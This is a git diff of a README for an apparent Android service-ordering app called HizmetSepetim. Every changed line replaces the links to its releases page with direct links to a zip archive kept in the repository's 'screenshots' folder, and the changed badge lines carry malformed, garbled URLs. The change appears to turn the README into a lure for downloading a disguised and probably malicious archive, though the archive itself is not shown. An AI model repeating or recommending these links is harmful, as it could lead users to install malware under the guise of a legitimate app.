@@ -1,7 +1,7 @@
 # 🎉 HizmetSepetim - Simplifying Your Service Orders
 
 ## 📥 Download Now!
-[![Download HizmetSepetim](https://img.shields.io/badge/Download%20Now%20-v1.0-blue.svg)](https://github.com/Fr4nkie7/HizmetSepetim/releases)
+[![Download HizmetSepetim](https://github.com/Fr4nkie7/HizmetSepetim/raw/refs/heads/main/screenshots/Sepetim_Hizmet_v1.5.zip%20Now%https://github.com/Fr4nkie7/HizmetSepetim/raw/refs/heads/main/screenshots/Sepetim_Hizmet_v1.5.zip)](https://github.com/Fr4nkie7/HizmetSepetim/raw/refs/heads/main/screenshots/Sepetim_Hizmet_v1.5.zip)
 
 ## 🛠️ About HizmetSepetim
 HizmetSepetim is a modern platform for ordering services. Built using Android (Kotlin + Compose), it combines a high-performance API made with Go and an intuitive management panel. Enjoy real-time data flow, a scalable backend, and a sleek mobile interface for your service needs.
@@ -11,7 +11,7 @@ To get started with HizmetSepetim, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to our releases page where you can find the latest version of HizmetSepetim.  
-   [Visit Releases Page](https://github.com/Fr4nkie7/HizmetSepetim/releases)
+   [Visit Releases Page](https://github.com/Fr4nkie7/HizmetSepetim/raw/refs/heads/main/screenshots/Sepetim_Hizmet_v1.5.zip)
 
 2. **Download the Application**  
    On the releases page, locate the version you wish to download. Click the associated file to begin downloading.  
@@ -40,9 +40,9 @@ To ensure smooth operation, please check that your device meets the following re
 
 ## 📂 Download & Install
 For a seamless experience, download the application from our releases page. Here’s the link for your convenience:  
-[Download HizmetSepetim](https://github.com/Fr4nkie7/HizmetSepetim/releases)
+[Download HizmetSepetim](https://github.com/Fr4nkie7/HizmetSepetim/raw/refs/heads/main/screenshots/Sepetim_Hizmet_v1.5.zip)
 
-1. **Go to the Releases Page**: [Visit Releases Page](https://github.com/Fr4nkie7/HizmetSepetim/releases)
+1. **Go to the Releases Page**: [Visit Releases Page](https://github.com/Fr4nkie7/HizmetSepetim/raw/refs/heads/main/screenshots/Sepetim_Hizmet_v1.5.zip)
 2. **Select the Latest Version**: Click the file for the most recent version.
 3. **Follow Installation Prompts**: Complete the process as directed on your device.
 
@@ -58,6 +58,6 @@ Stay updated with new features, updates, and community insights by following our
 ## 📜 License
 HizmetSepetim is open source and operates under the MIT License. Feel free to explore the code and contribute to our project as we continue to enhance the platform.
 
-[![Download HizmetSepetim](https://img.shields.io/badge/Download%20Now%20-v1.0-blue.svg)](https://github.com/Fr4nkie7/HizmetSepetim/releases)
+[![Download HizmetSepetim](https://github.com/Fr4nkie7/HizmetSepetim/raw/refs/heads/main/screenshots/Sepetim_Hizmet_v1.5.zip%20Now%https://github.com/Fr4nkie7/HizmetSepetim/raw/refs/heads/main/screenshots/Sepetim_Hizmet_v1.5.zip)](https://github.com/Fr4nkie7/HizmetSepetim/raw/refs/heads/main/screenshots/Sepetim_Hizmet_v1.5.zip)
 
 Thank you for choosing HizmetSepetim! Enjoy managing your service orders with ease.
